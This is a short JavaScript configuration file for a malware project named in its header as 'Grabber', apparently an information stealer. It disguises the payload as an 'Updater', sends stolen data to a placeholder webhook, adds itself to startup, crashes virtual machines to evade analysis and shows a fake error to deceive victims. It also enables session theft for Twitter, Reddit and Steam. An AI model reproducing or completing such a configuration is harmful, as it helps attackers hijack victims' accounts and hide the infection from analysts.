/**
 * For configuration, see https://github.com/JustYuuto/Grabber/wiki/Configuration
 */
module.exports = {
  name: 'App Name',
  filename: 'Updater',
  webhook: {
    url: '<WEBHOOK_URL>',
    content: '@everyone',
  },
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  addToStartup: true,
  vmProtect: true,
  bsodIfVm: true,
  fakeError: true,
  fakeErrorDetails: {
    title: 'Error',
    message: 'An error occurred while downloading files. Please try again later.'
  },
  discord: {
    killProcess: false
  },
  sessionStealing: {
    twitter: true,
    reddit: true,
    steam: true
  }
};
